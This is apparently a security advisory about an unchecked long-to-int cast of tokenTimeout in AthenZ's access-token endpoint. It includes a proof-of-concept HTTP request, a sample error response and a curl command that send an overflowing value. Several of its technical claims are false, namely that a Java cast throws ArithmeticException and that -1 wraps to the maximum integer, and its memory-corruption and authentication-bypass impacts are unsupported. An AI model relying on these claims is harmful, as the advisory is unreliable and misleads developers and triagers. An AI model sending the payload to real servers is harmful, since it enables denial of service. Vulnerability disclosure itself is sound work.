# 🔐 AthenZ Access Token API: Numeric Casting Vulnerability in `tokenTimeout`

## Summary

A critical vulnerability was discovered in the `AthenZ` access token generation logic due to an unsafe numeric cast of a user-controlled parameter. This vulnerability enables attackers to manipulate token expiration, trigger denial-of-service, or potentially cause memory exhaustion in the JVM.

* **Project:** [AthenZ](https://github.com/AthenZ/athenz)
* **Affected Component:** `ZTSImpl.java` (`/zts/v1/accesstoken` endpoint)
* **Vulnerability Type:** Unsafe Numeric Cast (CWE-681)
* **Severity:** High
* **CVSS v3.1:** 7.5 (High) – AV\:N/AC\:L/PR\:L/UI\:N/S\:U/C\:N/I\:N/A\:H
* **Status:** Fixed in [PR #3033](https://github.com/AthenZ/athenz/pull/3033)

---

## Details
In the `ZTSImpl.java` implementation, the `tokenTimeout` field (of type `long`) from an incoming JSON request is cast directly to a Java `int` without bounds checking:

```java
long tokenTimeout = request.getTokenTimeout(); // User-controlled
int timeout = (int) tokenTimeout; // 
```

When large or negative `long` values are passed, the cast overflows or wraps around the `int` range, resulting in unexpected runtime behavior, including:

* **ArithmeticException** due to invalid timeouts.
* **Denial-of-Service** from unhandled JVM errors or crashes.
* **Token Logic Bypass**, e.g., issuing tokens that last for decades.

---

## Proof of Concept (PoC)

### Prerequisites

* Running vulnerable version of AthenZ ZTS (before PR #3033).
* Access to `POST /zts/v1/accesstoken` endpoint.
* Valid client credentials or certificate (ZMS service identity).

## Burp Suite HTTP Request
```http
POST /zts/v1/accesstoken HTTP/1.1
Host: zts.example.com:4443
Content-Type: application/json
Connection: close

{
  "grantType": "client_credentials",
  "scope": "admin",
  "tokenTimeout": 2147483648
}
```

## Vulnerable Response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{
  "code": 500,
  "message": "java.lang.ArithmeticException: integer overflow"
}
```


## Vulnerable Code

[`ZTSImpl.java`](https://github.com/AthenZ/athenz/blob/3bdd5b8a5bb50b1a93c2207b32b32dd3344f86f3/servers/zts/src/main/java/com/yahoo/athenz/zts/ZTSImpl.java#L2715)

```java
public AccessTokenResponse postAccessTokenRequest(ResourceContext context, 
    AccessTokenRequest request) {

    long tokenTimeout = request.getTokenTimeout();  // 🛑 Unvalidated input
    int timeout = (int) tokenTimeout;              // ❌ Unsafe cast

    return generateAccessToken(..., timeout);
}
```


## Exploitation Impact

### 1. Denial-of-Service
Passing `tokenTimeout = 2147483648` causes overflow to negative `int`, triggering:

```
java.lang.ArithmeticException: integer overflow
```

## Token Lifetime Manipulation
Passing `tokenTimeout = -1` results in a maximum positive integer value (`2147483647`), issuing tokens valid for decades.

## JVM Memory Corruption (Theoretical)
Passing `Long.MAX_VALUE` or malformed payloads could result in excessive heap memory allocation attempts.

## CLI Exploitation (Using `curl` or ZMS CLI)

```bash
curl -k -X POST 'https://localhost:4443/zts/v1/accesstoken' \
  -H 'Content-Type: application/json' \
  --cert service_cert.pem --key service_key.pem \
  -d '{
    "grantType": "client_credentials",
    "scope": "admin",
    "tokenTimeout": 2147483648
  }'
```


## Impact
This vulnerability stems from improper numeric type conversion (`long → int`) without input validation. An attacker can supply large or negative values to manipulate internal logic. The most severe consequences include:

* **Denial-of-Service (DoS):** Exploiting casting edge cases triggers runtime exceptions and crashes.
* **Authentication Bypass:** Tokens issued with manipulated lifetimes could be used for extended access far beyond intended expiration.
* **Potential Resource Exhaustion:** Large tokenTimeout values may overload memory due to unchecked allocation.

---


## References

* [CWE-681: Incorrect Conversion Between Numeric Types](https://cwe.mitre.org/data/definitions/681.html)
* [CERT Java NUM12-J](https://wiki.sei.cmu.edu/confluence/display/java/NUM12-J.+Ensure+conversions+of+numeric+types+to+narrower+types)
* [AthenZ Access Token API Docs](https://athenz.io/docs/zts/zts-api/#postaccesstoken)
